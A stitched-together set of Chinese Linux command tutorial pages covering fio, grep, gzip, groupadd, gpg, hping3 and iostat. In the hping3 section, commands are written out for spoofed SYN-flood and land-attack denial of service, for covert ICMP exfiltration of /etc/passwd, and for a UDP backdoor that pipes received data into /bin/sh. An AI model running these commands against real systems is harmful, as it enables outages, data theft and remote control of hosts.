FIO是测试IOPS的非常好的工具，用来对磁盘进行压力测试和验证。磁盘IO是检查磁盘性能的重要指标，可以按照负载情况分成照顺序读写，随机读写两大类。FIO是一个可以产生很多线程或进程并执行用户指定的特定类型I/O操作的工具，FIO的典型用途是编写和模拟的I/O负载匹配的作业文件。也就是说FIO 是一个多线程io生成工具，可以生成多种IO模式，用来测试磁盘设备的性能（也包含文件系统：如针对网络文件系统 NFS 的IO测试）。 2. 参数 filename=/dev/sdb1 测试文件名称，通常选择需要测试的盘的data目录。 direct=1 是否使用directIO，测试过程绕过OS自带的buffer，使测试磁盘的结果更真实。Linux读写的时候，内核维护了缓存，数据先写到缓存，后面再后台写到SSD。读的时候也优先读缓存里的数据。这样速度可以加快，但是一旦掉电缓存里的数据就没了。所以有一种模式叫做DirectIO，跳过缓存，直接读写SSD。 rw=randwrite 测试随机写的I/O rw=randrw 测试随机写和读的I/O bs=16k 单次io的块文件大小为16k bsrange=512-2048 同上，提定数据块的大小范围 size=5G 每个线程读写的数据量是5GB。 numjobs=1 每个job（任务）开1个线程，这里用了几，后面每个用-name指定的任务就开几个线程测试。所以最终线程数=任务数（几个name=jobx）* numjobs。 name=job1：一个任务的名字，重复了也没关系。如果fio -name=job1 -name=job2，建立了两个任务，共享-name=job1之前的参数。-name之后的就是job2任务独有的参数。 thread 使用pthread_create创建线程，另一种是fork创建进程。进程的开销比线程要大，一般都采用thread测试。 runtime=1000 测试时间为1000秒，如果不写则一直将5g文件分4k每次写完为止。 ioengine=libaio 指定io引擎使用libaio方式。libaio：Linux本地异步I/O。请注意，Linux可能只支持具有非缓冲I/O的排队行为（设置为“direct=1”或“buffered=0”）；rbd:通过librbd直接访问CEPH Rados iodepth=16 队列的深度为16.在异步模式下，CPU不能一直无限的发命令到SSD。比如SSD执行读写如果发生了卡顿，那有可能系统会一直不停的发命令，几千个，甚至几万个，这样一方面SSD扛不住，另一方面这么多命令会很占内存，系统也要挂掉了。这样，就带来一个参数叫做队列深度。 Block Devices（RBD），无需使用内核RBD驱动程序（rbd.ko）。该参数包含很多ioengine，如：libhdfs/rdma等 rwmixwrite=30 在混合读写的模式下，写占30% group_reporting 关于显示结果的，汇总每个进程的信息。 此外 lockmem=1g 只使用1g内存进行测试。 zero_buffers 用0初始化系统buffer。 nrfiles=8 每个进程生成文件的数量。 磁盘读写常用测试点： 1. Read=100% Ramdon=100% rw=randread (100%随机读) 2. Read=100% Sequence=100% rw=read （100%顺序读） 3. Write=100% Sequence=100% rw=write （100%顺序写） 4. Write=100% Ramdon=100% rw=randwrite （100%随机写） 5. Read=70% Sequence=100% rw=rw, rwmixread=70, rwmixwrite=30 （70%顺序读，30%顺序写） 6. Read=70% Ramdon=100% rw=randrw, rwmixread=70, rwmixwrite=30 (70%随机读，30%随机写) 3. 示例 [root@docker sda]# fio -ioengine=libaio -bs=4k -direct=1 -thread -rw=read -filename=/dev/sda -name=\"BS 4KB read test\" -iodepth=16 -runtime=60 BS 4KB read test: (g=0): rw=read, bs=(R) 4096B-4096B, (W) 4096B-4096B, (T) 4096B-4096B, ioengine=libaio, iodepth=16 fio-3.7 Starting 1 thread Jobs: 1 (f=1): [R(1)][100.0%][r=89.3MiB/s,w=0KiB/s][r=22.9k,w=0 IOPS][eta 00m:00s] BS 4KB read test: (groupid=0, jobs=1): err= 0: pid=18557: Thu Apr 11 13:08:11 2019 read: IOPS=22.7k, BW=88.5MiB/s (92.8MB/s)(5313MiB/60001msec) slat (nsec): min=901, max=168330, avg=6932.34, stdev=1348.82 clat (usec): min=90, max=63760, avg=698.08, stdev=240.83 lat (usec): min=97, max=63762, avg=705.17, stdev=240.81 clat percentiles (usec): | 1.00th=[ 619], 5.00th=[ 627], 10.00th=[ 627], 20.00th=[ 635], | 30.00th=[ 635], 40.00th=[ 685], 50.00th=[ 717], 60.00th=[ 725], | 70.00th=[ 725], 80.00th=[ 725], 90.00th=[ 734], 95.00th=[ 816], | 99.00th=[ 1004], 99.50th=[ 1020], 99.90th=[ 1057], 99.95th=[ 1057], | 99.99th=[ 1860] bw ( KiB/s): min=62144, max=91552, per=100.00%, avg=90669.02, stdev=3533.77, samples=120 iops : min=15536, max=22888, avg=22667.27, stdev=883.44, samples=120 lat (usec) : 100=0.01%, 250=0.01%, 500=0.01%, 750=93.85%, 1000=5.14% lat (msec) : 2=0.99%, 4=0.01%, 10=0.01%, 50=0.01%, 100=0.01% cpu : usr=5.35%, sys=23.17%, ctx=1359692, majf=0, minf=17 IO depths : 1=0.1%, 2=0.1%, 4=0.1%, 8=0.1%, 16=100.0%, 32=0.0%, >=64=0.0% submit : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, >=64=0.0% complete : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.1%, 32=0.0%, 64=0.0%, >=64=0.0% issued rwts: total=1360097,0,0,0 short=0,0,0,0 dropped=0,0,0,0 latency : target=0, window=0, percentile=100.00%, depth=16 - List item Run status group 0 (all jobs): READ: bw=88.5MiB/s (92.8MB/s), 88.5MiB/s-88.5MiB/s (92.8MB/s-92.8MB/s), io=5313MiB (5571MB), run=60001-60001msec Disk stats (read/write): sda: ios=1357472/0, merge=70/0, ticks=949141/0, in_queue=948776, util=99.88% io=执行了多少M的IO bw=平均IO带宽 iops=IOPS runt=线程运行时间 slat=提交延迟，提交该IO请求到kernel所花的时间（不包括kernel处理的时间） clat=完成延迟, 提交该IO请求到kernel后，处理所花的时间 lat=响应时间 bw=带宽 cpu=利用率 IO depths=io队列 IO submit=单个IO提交要提交的IO数 IO complete=Like the above submit number, but for completions instead. IO issued=The number of read/write requests issued, and how many of them were short. IO latencies=IO完延迟的分布 io=总共执行了多少size的IO aggrb=group总带宽 minb=最小.平均带宽. maxb=最大平均带宽. mint=group中线程的最短运行时间. maxt=group中线程的最长运行时间. ios=所有group总共执行的IO数. merge=总共发生的IO合并数. ticks=Number of ticks we kept the disk busy. io_queue=花费在队列上的总共时间. util=磁盘利用率 更多阅读： fio(1) - Linux man page fio - Flexible I/O tester rev. 3.30 Sample FIO Commands for Block Volume Performance Tests on Linux-based Instances Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 04:28:40 "},"Linux-Command/Linux_Command_gpg.html":{"url":"Linux-Command/Linux_Command_gpg.html","title":"Linux Command Gpg","keywords":"","body":"Linux Command gpg 加密Linux Command gpg 加密 tagsstart 文件管理 tagsstop $ cat test ABC $ gpg -c test 图 1.2.28.1：在这里插入图片描述 $ ls test test.gpg $ rm -rf test $ cat test.gpg � d�#���S%��>����b����c�\\�G ���ﮇR��L test #输出密码 $ cat test ABC 更多阅读： GPG入门教程 图 1.2.28.2：在这里插入图片描述 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:31:56 "},"Linux-Command/Linux_Command_grep.html":{"url":"Linux-Command/Linux_Command_grep.html","title":"Linux Command Grep","keywords":"","body":"Linux Command grep1. 简介2. 参数3. 举例Linux Command grep tagsstart 文件管理 tagsstop 图 1.2.29.1：在这里插入图片描述 1. 简介 grep (global search regular expression(RE) and print out the line,全面搜索正则表达式并把行打印出来)是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。 Unix的grep家族包括grep、egrep和fgrep。egrep和fgrep的命令只跟grep有很小不同。egrep是grep的扩展，支持更多的re元字符， fgrep就是fixed grep或fast grep，它们把所有的字母都看作单词，也就是说，正则表达式中的元字符表示回其自身的字面意义，不再特殊。linux使用GNU版本的grep。它功能更强，可以通过-G、-E、-F命令行选项来使用egrep和fgrep的功能。 2. 参数 -V： 打印grep的版本号 -E： 解释PATTERN作为扩展正则表达式，也就相当于使用egrep。 或操作 -F : 解释PATTERN作为固定字符串的列表，由换行符分隔，其中任何一个都要匹配。也就相当于使用fgrep。 -G: 将范本样式视为普通的表示法来使用。这是默认值。加不加都是使用grep。 匹配控制选项： -e : 使用PATTERN作为模式。这可以用于指定多个搜索模式，或保护以连字符（ - ）开头的图案。指定字符串做为查找文件内容的样式。 -f : 指定规则文件，其内容含有一个或多个规则样式，让grep查找符合规则条件的文件内容，格式为每行一个规则样式。 -i : 搜索时候忽略大小写 -v: 反转匹配，选择没有被匹配到的内容。 -w：匹配整词，精确地单词,单词的两边必须是非字符符号(即不能是字母数字或下划线) -x：仅选择与整行完全匹配的匹配项。精确匹配整行内容(包括行首行尾那些看不到的空格内容都要完全匹配) -y：此参数的效果和指定“-i”参数相同。 一般输出控制选项： -c： 抑制正常输出;而是为每个输入文件打印匹配线的计数。 --color [= WHEN]：让关键字高亮显示，如--color=auto -L：列出文件内容不符合指定的范本样式的文件名称 -l : 列出文件内容符合指定的范本样式的文件名称。 -m num：当匹配内容的行数达到num行后,grep停止搜索,并输出停止前搜索到的匹配内容 -o: 只输出匹配的具体字符串,匹配行中其他内容不会输出 -q：安静模式,不会有任何输出内容,查找到匹配内容会返回0,未查找到匹配内容就返回非0 -s：不会输出查找过程中出现的任何错误消息，-q和-s选项因为与其他系统的grep有兼容问题，shell脚本应该避免使用-q和-s，并且应该将标准和错误输出重定向到/dev/null 代替。 输出线前缀控制： -b：输出每一个匹配行(或匹配的字符串)时在其前附加上偏移量(从文件第一个字符到该匹配内容之间的字节数) -H：在每一个匹配行之前加上文件名一起输出(针对于查找单个文件),当查找多个文件时默认就会输出文件名 -h：禁止输出上的文件名的前缀。无论查找几个文件都不会在匹配内容前输出文件名 --label = LABEL：显示实际来自标准输入的输入作为来自文件LABEL的输入。这是特别在实现zgrep等工具时非常有用，例如gzip -cd foo.gz | grep --label = foo -H的东西。看到 也是-H选项。 -n：输出匹配内容的同时输出其所在行号。 -T：初始标签确保实际行内容的第一个字符位于制表位上，以便对齐标签看起来很正常。在匹配信息和其前的附加信息之间加入tab以使格式整齐。 上下文线控制选项： -A num：匹配到搜索到的行以及该行下面的num行 -B num：匹配到搜索到的行以及该行上面的num行 -C num：匹配到搜索到的行以及上下各num行 文件和目录选择选项： -a： 处理二进制文件，就像它是文本;这相当于--binary-files = text选项。不忽略二进制的数据。 --binary-files = TYPE：如果文件的前几个字节指示文件包含二进制数据，则假定该文件为类型TYPE。默认情况下，TYPE是二进制的，grep通常输出一行消息二进制文件匹配，或者如果没有匹配则没有消息。如果TYPE不匹配，grep假定二进制文件不匹配;这相当于-I选项。如果TYPE是文本，则grep处理a二进制文件，如果它是文本;这相当于-a选项。警告：grep --binary-files = text可能会输出二进制的垃圾，如果输出是一个终端和如果可能有讨厌的副作用终端驱动程序将其中的一些解释为命令。 -D：如果输入文件是设备，FIFO或套接字，请使用ACTION处理。默认情况下，读取ACTION，这意味着设备被读取，就像它们是普通文件一样。如果跳过ACTION，设备为 默默地跳过。 -d: 如果输入文件是目录，请使用ACTION处理它。默认情况下，ACTION是读的，这意味着目录被读取，就像它们是普通文件一样。如果跳过ACTION，目录将静默跳过。如果ACTION是recurse，grep将递归读取每个目录下的所有文件;这是相当于-r选项。 --exclude=GLOB：跳过基本名称与GLOB匹配的文件（使用通配符匹配）。文件名glob可以使用*，？和[...]作为通配符，和\\引用通配符或反斜杠字符。搜索其文件名和GLOB通配符相匹配的文件的内容来查找匹配使用方法:grep -H --exclude=c* \"old\" ./* c*是通配文件名的通配符./* 指定需要先通配文件名的文件的范围,必须要给*,不然就匹配不出内容,(如果不给*,带上-r选项也可以匹配) --exclude-from = FILE：在文件中编写通配方案,grep将不会到匹配方案中文件名的文件去查找匹配内容 --exclude-dir = DIR：匹配一个目录下的很多内容同时还要让一些子目录不接受匹配,就使用此选项。 --include = GLOB：仅搜索其基本名称与GLOB匹配的文件（使用--exclude下所述的通配符匹配）。 -R ,-r :以递归方式读取每个目录下的所有文件; 这相当于-d recurse选项。 其他选项： --line-buffered： 在输出上使用行缓冲。这可能会导致性能损失。 --mmap：启用mmap系统调用代替read系统调用 -U：将文件视为二进制。 -z：将输入视为一组行，每一行由一个零字节（ASCII NUL字符）而不是a终止新队。与-Z或--null选项一样，此选项可以与排序-z等命令一起使用来处理任意文件名。 3. 举例 $ grep root /etc/passwd root:x:0:0:root:/root:/bin/bash operator:x:11:0:operator:/root:/sbin/nologin 或 $ cat /etc/passwd | grep root root:x:0:0:root:/root:/bin/bash operator:x:11:0:operator:/root:/sbin/nologin $ grep -n root /etc/passwd #显示行号 1:root:x:0:0:root:/root:/bin/bash 30:operator:x:11:0:operator:/root:/sbin/nologin $ grep -n root --color=auto /etc/passwd #显示行号；显示高亮 1:root:x:0:0:root:/root:/bin/bash 30:operator:x:11:0:operator:/root:/sbin/nologin $ grep -v root /etc/passwd #取反（没有root的行） backup:x:1000:1000::/home/backup:/bin/bash mysql:x:1001:1002::/home/mysql:/bin/bash $ grep -i root /etc/passwd #不区分大小写 backup:x:1000:1000::/home/backup:/bin/bash mysql:x:1001:1002::/home/mysql:/bin/bash $ cat passwd.txt root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync $ grep -A 2 daemon passwd.txt #向含有daemon的下取2行 daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin $ grep -B 2 daemon passwd.txt #向含有daemon的上取2行 root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin $ grep -C 2 daemon passwd.txt #向含有daemon的上下各取2行 root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin $ grep 'root' * #在当前目录搜索带'root'行的文件 $ grep -r 'root' * #在当前目录及其子目录下搜索'rooot'行的文件 $ grep -l -r 'root' * #在当前目录及其子目录下搜索'root'行的文件，但是不显示匹配的行，只显示匹配的文件 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:39:05 "},"Linux-Command/Linux_Command_group.html":{"url":"Linux-Command/Linux_Command_group.html","title":"Linux Command Group","keywords":"","body":"Linux Command groupadd 、groupdel、groupmod1. groupadd2. groupdel3. groupmodLinux Command groupadd 、groupdel、groupmod tagsstart 用户管理 tagsstop 1. groupadd groupadd命令用于创建一个新的工作组，新工作组的信息将被添加到系统文件中 -g：指定新建工作组的id； -r：创建系统工作组，系统工作组的组ID小于500； -K：覆盖配置文件“/ect/login.defs”； -o：允许添加组ID号不唯一的工作组。 -n NEW_GROUP：更改组名为 NEW_GROUP 1.创建组群test [root@localhost ~]# groupadd test1 2.创建组群test，并且设置该组群GID为800 [root@localhost ~]# grouadd -g 800 test1 3.创建系统组群test [root@localhost ~]# groupadd -r test1 2. groupdel 1.groupdel 命令用于删除用户组 [root@localhost ~]# groupdel test1 3. groupmod -g 　设置欲使用的群组识别码。 -o 　重复使用群组识别码。 -n 　设置欲使用的群组名称。 1.将 test1 组更名为 test2 [root@localhost ~]# groupmod -n test1 test2 2.将 test2 组的 GID 改为 3000 [root@localhost ~]# groupmod -g 3000 test2 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 16:16:29 "},"Linux-Command/Linux_Command_gzip.html":{"url":"Linux-Command/Linux_Command_gzip.html","title":"Linux Command Gzip","keywords":"","body":"Linux Command gzip 压缩1. 说明2. 安装3. 格式4. 参数5. 举例Linux Command gzip 压缩 tagsstart 文件管理 压缩解压 tagsstop 1. 说明 gunzip命令作用不能是目录,只能压缩单个文件。 2. 安装 准备编译 Gzip： ./configure --prefix=/usr --bindir=/bin 编译软件包： make 用以下命令测试结果： make check 安装软件包： make install 移动不需要在根文件系统的程序： mv -v /bin/{gzexe,uncompress,zcmp,zdiff,zegrep} /usr/bin mv -v /bin/{zfgrep,zforce,zgrep,zless,zmore,znew} /usr/bin 3. 格式 gunzip [-acfhlLnNqrtvV][-s ][文件...] 或者gunzip [-acfhlLnNqrtvV][-s ][目录] 4. 参数 -a或--ascii：使用ASCII文字模式。 -c或--stdout或--to-stdout：把解压后的文件输出到标准输出设备。 -d或--decompress或----uncompress 　解开压缩文件 -f或-force：强行解开压缩文件，不理会文件名称或硬连接是否存在，以及该文件是否为符号连接。 -h或--help：在线帮助。 -l或--list：列出压缩文件的相关信息。 -L或--license：显示版本与版权信息。 -n或--no-name：解压缩时，若压缩文件内含有原来的文件名称及时间戳记，则将其忽略不予处理。 -N或--name：解压缩时，若压缩文件内含有原来的文件名称及时间戳记，则将其回存到解开的文件上。 -q或--quiet：不显示警告信息。 -r或--recursive：递归处理，将指定目录下的所有文件及子目录一并处理。 -S或--suffix：更改压缩字尾字符串。 -t或--test：测试压缩文件是否正确无误。 -v或--verbose：显示指令执行过程。 -V或--version：显示版本信息。 5. 举例 1.Linux压缩保留源文件的方法： gzip -c filename > filename.gz 2.Linux解压缩保留源文件的方法： gunzip -c filename.gz > filename 3.把多文件不保留源文件压缩成.gz文件 $ ls 01.txt 02.txt 03.txt 04.txt 05.txt 06.txt $ gzip * $ ls 01.txt.gz 02.txt.gz 03.txt.gz 04.txt.gz 05.txt.gz 06.txt.gz 4.详细显示每个压缩的文件的信息，并不解压 $ gzip -l * compressed uncompressed ratio uncompressed_name 26 0 0.0% 1.txt 26 0 0.0% 2.txt 26 0 0.0% 3.txt 26 0 0.0% 4.txt 26 0 0.0% 5.txt 26 0 0.0% 6.txt 5.每个压缩的文件解压，并列出详细的信息 $ gzip -dv * 01.txt.gz: 0.0% -- replaced with 01.txt 02.txt.gz: 0.0% -- replaced with 02.txt 03.txt.gz: 0.0% -- replaced with 03.txt 04.txt.gz: 0.0% -- replaced with 04.txt 05.txt.gz: 0.0% -- replaced with 05.txt 06.txt.gz: 0.0% -- replaced with 06.txt $ ls 01.txt 02.txt 03.txt 04.txt 05.txt 06.txt 6.压缩一个tar备份文件，此时压缩文件的扩展名为.tar.gz $ ls log.tar log.tar $ gzip -r log.tar $ ls log.tar.gz 7.递归的压缩目录 $ ls 1.txt 2.txt 3.txt 4.txt 5.txt 6.txt $ cd .. $ gzip -rv dir1/ dir1//1.txt: 0.0% -- replaced with dir1//1.txt.gz dir1//2.txt: 0.0% -- replaced with dir1//2.txt.gz dir1//3.txt: 0.0% -- replaced with dir1//3.txt.gz dir1//4.txt: 0.0% -- replaced with dir1//4.txt.gz dir1//5.txt: 0.0% -- replaced with dir1//5.txt.gz dir1//6.txt: 0.0% -- replaced with dir1//6.txt.gz $ ls dir1/ 1.txt.gz 2.txt.gz 3.txt.gz 4.txt.gz 5.txt.gz 6.txt.gz 8.递归地解压目录 $ gzip -dr dir1/ $ ls dir1/ 1.txt 2.txt 3.txt 4.txt 5.txt 6.txt 更多阅读： Linux Command lz4 压缩 Linux Command tar 压缩 Linux Command gzip 压缩 Linux Command zip 压缩 图 1.2.31.1：在这里插入图片描述 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:25:16 "},"Linux-Command/Linux_Command_hping3.html":{"url":"Linux-Command/Linux_Command_hping3.html","title":"Linux Command Hping 3","keywords":"","body":"Linux Command hping3 测试网络安全工具1. 简介2. 安装3. 选项4. Hping3功能4.1 防火墙测试4.2 端口扫描4.3 Idle扫描4.4 拒绝服务攻击4.5 文件传输4.6 木马功能Linux Command hping3 测试网络安全工具 tagsstart 网络 tagsstop 1. 简介 测试网络及主机的安全。 hping 是用于生成和解析TCPIP协议数据包的开源工具。创作者是Salvatore Sanfilippo。目前最新版是hping3，支持使用tcl脚本自动化地调用其API。hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。 2. 安装 yum install libpcap-devel tc-devel ln -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h wget http://www.hping.org/hping3-20051105.tar.gz tar zxvf hping3-20051105.tar.gz cd hping3-20051105 ./configure make make install 3. 选项 -H --help 显示帮助。 -v -VERSION 版本信息。 -c --count count 发送数据包的次数 关于countreached_timeout 可以在hping2.h里编辑。 -i --interval 包发送间隔时间（单位是毫秒）缺省时间是1秒,此功能在增加传输率上很重要,在idle/spoofing扫描时此功能也会被用到,你可以参考hping-howto获得更多信息-fast 每秒发10个数据包。 -n -nmeric 数字输出，象征性输出主机地址。 -q -quiet 退出。 -I --interface interface name 无非就是eth0之类的参数。 -v --verbose 显示很多信息，TCP回应一般如：len=46 ip=192.168.1.1 flags=RADF seq=0 ttl=255 id=0 win=0 rtt=0.4ms tos=0 iplen=40 seq=0 ack=1380893504 sum=2010 urp=0 -D --debug 进入debug模式当你遇到麻烦时，比如用HPING遇到一些不合你习惯的时候，你可以用此模式修改HPING，（INTERFACE DETECTION,DATA LINK LAYER ACCESS,INTERFACE SETTINGS,.......） -z --bind 快捷键的使用。 -Z --unbind 消除快捷键。 -O --rawip RAWIP模式，在此模式下HPING会发送带数据的IP头。 -1 --icmp ICMP模式，此模式下HPING会发送IGMP应答报，你可以用--ICMPTYPE --ICMPCODE选项发送其他类型/模式的ICMP报文。 -2 --udp UDP 模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用--baseport --destport --keep选项指定其模式。 -9 --listen signatuer hping的listen模式，用此模式，HPING会接收指定的数据。 -a --spoof hostname 伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。 -t --ttl time to live 可以指定发出包的TTL值。 -H --ipproto 在RAW IP模式里选择IP协议。 -w --WINID UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。 -r --rel 更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。 -F --FRAG 更改包的FRAG，这可以测试对方对于包碎片的处理能力，缺省的“virtual mtu”是16字节。 -x --morefrag 此功能可以发送碎片使主机忙于恢复碎片而造成主机的拒绝服务。 -y -dontfrag 发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。 -G --fragoff fragment offset value set the fragment offset -m --mtu mtu value 用此项后ID数值变得很大，50000没指定此项时3000-20000左右。 -G --rroute 记录路由，可以看到详悉的数据等等，最多可以经过9个路由，即使主机屏蔽了ICMP报文。 -C --ICMPTYPE type 指定ICMP类型，缺省是ICMP echo REQUEST。 -K --ICMPCODE CODE 指定ICMP代号，缺省0。 --icmp-ipver 把IP版本也插入IP头。 --icmp-iphlen 设置IP头的长度，缺省为5（32字节）。 --icmp-iplen 设置IP包长度。 --icmp-ipid 设置ICMP报文IP头的ID，缺省是RANDOM。 --icmp-ipproto 设置协议的，缺省是TCP。 -icmp-cksum 设置校验和。 -icmp-ts alias for --icmptype 13 (to send ICMP timestamp requests) --icmp-addr Alias for --icmptype 17 (to send ICMP address mask requests) -s --baseport source port hping 用源端口猜测回应的包，它从一个基本端口计数，每收一个包，端口也加1，这规则你可以自己定义。 -p --deskport [+][+]desk port 设置目标端口，缺省为0，一个加号设置为:每发送一个请求包到达后，端口加1，两个加号为：每发一个包，端口数加1。 --keep 上面说过了。 -w --win 发的大小和windows一样大，64BYTE。 -O --tcpoff Set fake tcp data offset. Normal data offset is tcphdrlen / 4. -m --tcpseq 设置TCP序列数。 -l --tcpck 设置TCP ack。 -Q --seqnum 搜集序列号的，这对于你分析TCP序列号有很大作用。 4. Hping3功能 Hping3主要有以下典型功能应用： 4.1 防火墙测试 测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。 hping3 -S -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10 4.2 端口扫描 Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放： hping3 -I eth0 -S 192.168.10.1 -p 80 其中-I eth0指定使用eth0端口，-S指定TCP包的标志位SYN，-p 80指定探测的目的端口。 hping3支持非常丰富的端口探测方式，nmap拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。 4.3 Idle扫描 Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。 该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。 4.4 拒绝服务攻击 使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。 hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000 其他攻击如smurf、teardrop、land attack等也很容易构建出来。 4.5 文件传输 Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务： hping3 192.168.1.159--listen signature --safe --icmp 监听ICMP包中的签名，根据签名解析出文件内容。 在发送端使用签名打包的ICMP包发送文件： hping3 192.168.1.108--icmp ?d 100 --sign signature --file /etc/passwd 将/etc/passwd密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。 4.6 木马功能 如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。 示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。 在木马启动端： hping3 192.168.10.66--listen signature --safe --udp -p 53 | /bin/sh 在远程控制端： echo ls >test.cmd hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd 将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。 当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。 更多阅读： hping3(8) - Linux man page Hping Tips and Tricks Hping3: Create TCP / IP Packets and Perform DoS Attacks on Lin Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:47:29 "},"Linux-Command/Linux_Command_iostat.html":{"url":"Linux-Command/Linux_Command_iostat.html","title":"Linux Command Iostat","keywords":"","body":"Linux Command iostat 监控IO负载1. 介绍2. 语法3. 参数3.1 -d -k3.2 -x3.3 -c4. 示例5. 总结Linux Command iostat 监控IO负载 tagsstart 监控 分析 tagsstop 1. 介绍 iostat主要用于监控系统设备的IO负载情况，iostat首次运行时显示自系统启动开始的各项统计信息，之后运行iostat将显示自上次运行该命令以后的统计信息。用户可以通过指定统计的次数和时间来获得所需的统计信息。 2. 语法 iostat [ -c ] [ -d ] [ -h ] [ -N ] [ -k | -m ] [ -t ] [ -V ] [ -x ] [ -z ] [ device [...] | ALL ] [ -p [ device [,...] | ALL ] ] [ interval [ count ] ] 3. 参数 -C 显示CPU使用情况 -d 显示磁盘使用情况 -k 以 KB 为单位显示 -m 以 M 为单位显示 -N 显示磁盘阵列(LVM) 信息 -n 显示NFS 使用情况 -p[磁盘] 显示磁盘和分区的情况 -t 显示终端和CPU的信息 -x 显示详细信息 -V 显示版本信息 3.1 -d -k iostat -d -k 2 -d 表示，显示设备（磁盘）使用状态； -k某些使用block为单位的列强制使用Kilobytes为单位；2表示，数据显示每隔2秒刷新一次。 iostat -d -k 1 10 Device: tps kB_read/s kB_wrtn/s kB_read kB_wrtn sda 39.29 21.14 1.44 441339807 29990031 sda1 0.00 0.00 0.00 1623 523 sda2 1.32 1.43 4.54 29834273 94827104 sda3 6.30 0.85 24.95 17816289 520725244 sda5 0.85 0.46 3.40 9543503 70970116 sda6 0.00 0.00 0.00 550 236 sda7 0.00 0.00 0.00 406 0 sda8 0.00 0.00 0.00 406 0 sda9 0.00 0.00 0.00 406 0 sda10 60.68 18.35 71.43 383002263 1490928140 Device: tps kB_read/s kB_wrtn/s kB_read kB_wrtn sda 327.55 5159.18 102.04 5056 100 sda1 0.00 0.00 0.00 0 0 输出信息的意义 tps：该设备每秒的传输次数（Indicate the number of transfers per second that were issued to the device.）。\"一次传输\"意思是\"一次I/O请求\"。多个逻辑请求可能会被合并为\"一次I/O请求\"。\"一次传输\"请求的大小是未知的。 kB_read/s：每秒从设备（drive expressed）读取的数据量； kB_wrtn/s：每秒向设备（drive expressed）写入的数据量； kB_read：读取的总数据量； kB_wrtn：写入的总数量数据量；这些单位都为Kilobytes。 上面的例子中，我们可以看到磁盘sda以及它的各个分区的统计数据，当时统计的磁盘总TPS是39.29，下面是各个分区的TPS。（因为是瞬间值，所以总TPS并不严格等于各个分区TPS的总和） 指定监控的设备名称为sda，该命令的输出结果和上面命令完全相同。 iostat -d sda 2 默认监控所有的硬盘设备，现在指定只监控sda。 3.2 -x 